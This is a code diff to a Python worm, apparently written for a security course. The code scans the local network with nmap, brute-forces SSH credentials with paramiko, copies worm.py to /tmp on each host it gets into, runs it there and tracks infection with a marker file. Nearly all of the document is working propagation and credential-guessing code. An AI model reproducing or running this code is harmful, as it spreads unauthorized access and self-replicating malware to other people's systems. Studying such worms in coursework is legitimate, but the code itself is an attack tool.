@@ -1,9 +1,7 @@
 import paramiko
-import socket
 import nmap
-import netinfo
+import socket
 import os
-import sys
 
 class Replicator(object):
 
@@ -24,11 +22,14 @@ class Replicator(object):
 		self.sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 	def spreadAndExecute(self):
-		self.sshClient.put("worm.py", "/tmp/" + "worm.py")
+		sftpClient = self.sshClient.open_sftp()
+
+		sftpClient.put("worm.py", "/tmp/" + "worm.py")
 	
 		self.sshClient.exec_command("chmod a+x /tmp/worm.py")
 
-		self.sshClient.exec_command("nohup python /tmp/worm.py &")
+		# self.sshClient.exec_command("nohup python /tmp/worm.py &")
+		self.sshClient.exec_command("python /tmp/worm.py")
 
 	def tryCredentials(self, host, username, password):
 		try:
@@ -51,27 +52,40 @@ class Replicator(object):
 
 			attemptResults = self.tryCredentials(host, username, password)
 
-			if attemptResults == Replicator.SUCCESSFUL_CONNECTION:
-				return (self.sshClient, attemptResults) #Possibly need a copy of the instance?
+			print('(' + username + ', ' + password + '): ' + str(attemptResults))
 
-		return attemptResults
+			if attemptResults == Replicator.SUCCESSFUL_CONNECTION:
+				return (attemptResults, self.sshClient) # Possibly need a copy of the instance?
+
+		return (attemptResults, None)
+
+	def remoteSystemIsInfected(self):
+		sftpClient = self.sshClient.open_sftp()
+
+		try:
+			sftpClient.get(Replicator.INFECTED_MARKER_FILE, '/home/cpsc/')
+		except IOError:
+			print("This system should be infected")
+			return False
+
+		return True
 
 	@staticmethod
-	def isInfectedSystem(self):
+	def isInfectedSystem():
 		return os.path.isfile(Replicator.INFECTED_MARKER_FILE)
 
 	@staticmethod
-	def markInfected(self):
+	def markInfected():
 		open(Replicator.INFECTED_MARKER_FILE, 'a').close()
 
 	@staticmethod
-	def getMyIP(self, interface):
-		sck = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-		return socket.inet_ntoa(fcntl.ioctl(sck.fileno(),0x8915,struct.pack(b'256s', ifn[:15]))[20:24])
+	def getMyIP():
+		# Using other method for getting current IP. Original example given in the sample
+		# code was generating errors.
+		return socket.gethostbyname(socket.gethostname())
 
 	@staticmethod
-	def getHostsOnTheSameNetwork(self):
+	def getHostsOnTheSameNetwork():
 		
 		portScanner = nmap.PortScanner()
 
@@ -88,12 +102,3 @@ class Replicator(object):
 				runningHosts.append(host)
 
 		return runningHosts
-
-
-
-
-
-
-
-
-
